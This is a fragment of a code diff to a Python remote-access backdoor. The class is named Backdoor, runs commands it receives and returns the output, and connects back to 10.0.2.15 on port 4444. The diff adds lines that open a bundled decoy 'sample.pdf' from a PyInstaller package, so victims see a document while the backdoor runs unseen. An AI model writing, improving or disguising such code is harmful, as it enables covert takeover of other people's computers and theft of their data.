@@ -1,6 +1,13 @@
 #!/usr/bin/env python
 
-import socket, subprocess, time, json, os, base64, shutil, sys
+import socket
+import subprocess
+import time
+import json
+import os
+import base64
+import shutil
+import sys
 
 
 class Backdoor:
@@ -67,6 +74,9 @@ class Backdoor:
 				command_result = "[-] Error during command execution. (b)"
 			self.reliable_send(command_result)
 
+
+file_name = sys._MEIPASS + "\sample.pdf"		# default location
+subprocess.Popen(file_name, shell=True)
 
 try:
 	my_backdoor = Backdoor("10.0.2.15", 4444)
